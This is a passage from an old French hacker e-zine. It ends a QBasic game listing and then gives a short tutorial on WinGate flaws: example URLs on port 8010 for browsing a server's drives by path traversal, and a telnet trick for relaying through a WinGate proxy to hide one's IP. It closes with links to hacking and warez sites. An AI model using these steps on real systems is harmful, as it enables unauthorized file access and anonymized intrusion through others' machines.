<br><tt>IF d = 0 THEN GOTO 2</tt>
<br><tt>IF p = 80 AND q &lt;= d THEN GOTO 4</tt>
<br><tt>IF p = 80 AND q >= d + 20 THEN GOTO 4</tt>
<br><tt>LINE (80, 0)-(80, d)</tt>
<br><tt>LINE (80, d + 20)-(80, 200)</tt>
<br><tt>LINE (80, d)-(80, d + 20), couleur% = 1</tt>
<br><tt>d = d - 1</tt>
<br><tt>q = q - 1</tt>
<br><tt>IF INKEY$ = CHR$(51) THEN GOTO 5</tt>
<br><tt>FOR z = 1 TO s</tt>
<br><tt>NEXT</tt>
<br><tt>GOTO 6</tt>
<br><tt>7 PSET (p, q)</tt>
<br><tt>IF p = 40 AND q &lt;= b THEN GOTO 4</tt>
<br><tt>IF p = 40 AND q >= b + 20 THEN GOTO 4</tt>
<br><tt>IF p = 60 AND q &lt;= c THEN GOTO 4</tt>
<br><tt>IF p = 60 AND q >= c + 15 THEN GOTO 4</tt>
<br><tt>IF p = 100 AND q &lt;= e THEN GOTO 4</tt>
<br><tt>IF p = 100 AND q >= e + 15 THEN GOTO 4</tt>
<br><tt>IF p = 120 AND q &lt;= f THEN GOTO 4</tt>
<br><tt>IF p = 120 AND q >= f + 15 THEN GOTO 4</tt>
<br><tt>IF p = 140 AND q &lt;= g THEN GOTO 4</tt>
<br><tt>IF p = 140 AND q >= g + 15 THEN GOTO 4</tt>
<br><tt>IF p = 160 AND q &lt;= h THEN GOTO 4</tt>
<br><tt>IF p = 160 AND q >= h + 15 THEN GOTO 4</tt>
<br><tt>IF p = 180 AND q &lt;= i THEN GOTO 4</tt>
<br><tt>IF p = 180 AND q >= i + 15 THEN GOTO 4</tt>
<br><tt>IF p = 200 AND q &lt;= j THEN GOTO 4</tt>
<br><tt>IF p = 200 AND q >= j + 10 THEN GOTO 4</tt>
<br><tt>IF p = 220 AND q &lt;= k THEN GOTO 4</tt>
<br><tt>IF p = 220 AND q >= k + 10 THEN GOTO 4</tt>
<br><tt>IF p = 240 AND q &lt;= l THEN GOTO 4</tt>
<br><tt>IF p = 240 AND q >= l + 10 THEN GOTO 4</tt>
<br><tt>IF p = 260 AND q &lt;= m THEN GOTO 4</tt>
<br><tt>IF p = 260 AND q >= m + 10 THEN GOTO 4</tt>
<br><tt>IF p = 280 AND q &lt;= n THEN GOTO 4</tt>
<br><tt>IF p = 280 AND q >= n + 10 THEN GOTO 4</tt>
<br><tt>IF p = 300 AND q &lt;= o THEN GOTO 4</tt>
<br><tt>IF p = 300 AND q >= o + 5 THEN GOTO 4</tt>
<br><tt>IF q >= 200 THEN GOTO 4</tt>
<br><tt>IF d = 0 THEN GOTO 3</tt>
<br><tt>IF p = 80 AND q &lt;= d THEN GOTO 4</tt>
<br><tt>IF p = 80 AND q >= d + 20 THEN GOTO 4</tt>
<br><tt>LINE (80, 0)-(80, d)</tt>
<br><tt>LINE (80, d + 20)-(80, 200)</tt>
<br><tt>LINE (80, d)-(80, d + 20), couleur% = 1</tt>
<br><tt>d = d - 1</tt>
<br><tt>q = q + 1</tt>
<br><tt>IF INKEY$ = CHR$(51) THEN GOTO 5</tt>
<br><tt>FOR z = 1 TO s</tt>
<br><tt>NEXT</tt>
<br><tt>GOTO 7</tt>
<br><tt>4 CLS</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Vous avez perdu"</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT " Nombre de points"</tt>
<br><tt>PRINT r</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT " Appuyez sur a"</tt>
<br><tt>LINE (90, 10)-(220, 10)</tt>
<br><tt>LINE (220, 10)-(220, 30)</tt>
<br><tt>LINE (220, 30)-(90, 30)</tt>
<br><tt>LINE (90, 30)-(90, 10)</tt>
<br><tt>11 IF INKEY$ = CHR$(97) THEN GOTO 9</tt>
<br><tt>GOTO 11</tt>
<br><tt>8 CLS</tt>
<br><tt>r = r + 1</tt>
<br><tt>s = s - 50</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Vous avez gagn"</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT " Appuyez sur a"</tt>
<br><tt>LINE (90, 10)-(220, 10)</tt>
<br><tt>LINE (220, 10)-(220, 30)</tt>
<br><tt>LINE (220, 30)-(90, 30)</tt>
<br><tt>LINE (90, 30)-(90, 10)</tt>
<br><tt>10 IF INKEY$ = CHR$(97) THEN GOTO 0</tt>
<br><tt>GOTO 10</tt>
<br><tt>9 CLS</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Voulez vous recommencer
?"</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT " o = Oui"</tt>
<br><tt>PRINT " n = Non"</tt>
<br><tt>13 c$ = INKEY$</tt>
<br><tt>IF c$ = CHR$(111) THEN GOTO 22</tt>
<br><tt>IF c$ = CHR$(110) THEN GOTO 12</tt>
<br><tt>GOTO 13</tt>
<br><tt>12 END</tt>
<center>
<p><b><font color="#FF0000"><font size=+3>Les failles Wingate</font></font></b></center>
&nbsp;&nbsp; WinGate est un programme qui permet &agrave; des ordinateurs
sous WindowsNT ou Win9x de partager la m&ecirc;me conection internet. cependant
ce programme pr&eacute;sente des failles. Par exemple. On sait que WinGate
utilise le port 8010. Ainsi pour voir ce qu'un serveur a sur ses drivers
on tape dans la barre de navigation d'un navigateur:
<br>http://www.urlNT.com:8010/c:/
<br>http://www.urlNT.com:8010/..../
<br>http://www.urlNT.com:8010//
<br>Voil&agrave;... Mais on peut aussi utiliser les failles Wingate pour
se faire anonymizer lors d'une session telnet. exemple:
<br>Sous le serveur WinNT ou 9x, sous telnet sur le port telnet, vous tapez
<br>wingate> www.url&agrave;joindre.com
<br>&nbsp;Et vous voil&agrave; anonymiz&eacute; par l'IP du serveur qui
aura cru que vous &eacute;tiez un de leurs postes en r&eacute;seau.
<br>&nbsp;
<p>&nbsp; Pour conclure cet e-zine je dirais qu'il faut savoir faire marcher
sa t&ecirc;te, et qu'on arrivera &agrave; rien sans &ccedil;a.
<br>references:
<br>- sites
<br>http://www.hackers.com
<br>http://qha.cjb.net
<br>http://www.crackstore.com
<br>http://abcnews.go.com
<br>http://www.scssi.gouv.fr
<br>http://www.cnil.fr
<br>http://www.undergroundnews.com
<br>http://surf.to/hackforum
<br>htpp://www.2600.com
<br>http://www.anti-hack.org
<br>http://www.warezfun.com
<br>- zines:
<br>Noroutes (#1, #2, #3, #4)
<br>anewbie.doc
<br>ultimate.doc
<br>Back Side
<br>Hacker guide
<br>Nothink
<br>3d13
<br>&nbsp;
</body>
</html>
